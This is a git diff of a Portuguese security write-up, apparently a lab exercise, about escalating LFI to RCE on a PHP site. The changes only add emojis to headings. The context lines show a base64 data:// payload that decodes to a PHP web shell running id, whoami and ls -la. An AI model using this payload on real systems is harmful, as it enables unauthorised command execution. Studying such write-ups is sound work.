@@ -49,7 +49,7 @@ in /var/www/html/index.php on line 54
 
 ---
 
-## 🧪 Testes Realizados
+## 🧪 Testes Realizados 💉
 
 ### Teste 2:
 <img width="995" height="207" alt="image" src="https://github.com/user-attachments/assets/ddd1206a-14f5-4ec6-abfd-5a8ce98cd182" />
@@ -76,7 +76,7 @@ in /var/www/html/index.php on line 54
 
 - Pesquisando sobre possíveis **RCEs (Remote Code Execution)**, encontrei que é possível usar `data://text/plain;base64` para injetar comandos.
 
-### ▶️ Executando `id`
+### ▶️ Executando `id` 💉
 ```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
 ```
@@ -87,7 +87,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
 
 ---
 
-### ▶️ Executando `whoami`
+### ▶️ Executando `whoami` 💉
 ```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
 ```
@@ -96,7 +96,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
 
 ---
 
-### ▶️ Executando `ls -la`
+### ▶️ Executando `ls -la` 💉
 ```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la
 
@@ -131,7 +131,7 @@ data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls%20-la
 
 ---
 
-# 📖 Conclusão
+# 📖 Conclusão 💉
 
 - ✔️ O site apresenta vulnerabilidades de **LFI** que podem evoluir para **RCE** utilizando técnicas de **Base64 Data Wrapper**.  
 - ✔️ Foram identificadas credenciais em **Base64**, sugerindo possível exploração de acesso.  
